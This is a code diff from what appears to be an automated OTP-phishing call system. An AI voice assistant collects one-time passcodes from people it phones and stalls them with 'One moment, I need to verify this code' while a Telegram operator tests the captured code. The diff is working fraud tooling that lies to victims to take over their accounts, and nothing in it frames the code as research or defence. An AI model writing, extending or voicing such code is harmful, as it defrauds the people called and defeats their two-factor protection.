@@ -61,6 +61,23 @@ def notify_otp_captured(
 
     log_otp(call_sid, digits, status="captured")
 
+    def _hold_assistant(vapi_id):
+        """Speak a short hold line, then let the AI fall silent (turn-based) while
+        the Telegram user decides on ACCEPT/DECLINE. The resume lines are spoken
+        later on accept/decline/auto-accept."""
+        try:
+            from services.vapi_service import say_to_assistant
+            say_to_assistant(vapi_id, "One moment, I need to verify this code.")
+        except Exception as e:
+            logger.debug(f"Vapi hold say failed: {e}")
+        finally:
+            if session and session.get("otp_status") == "pending":
+                session["otp_hold_active"] = True
+
+    session_id = vapi_call_id or call_sid
+    if session_id:
+        threading.Thread(target=_hold_assistant, args=(session_id,), daemon=True).start()
+
     def _end_vapi_call():
         session_local = get_call_session(call_sid)
         if session_local and session_local.get("vapi_call_id"):
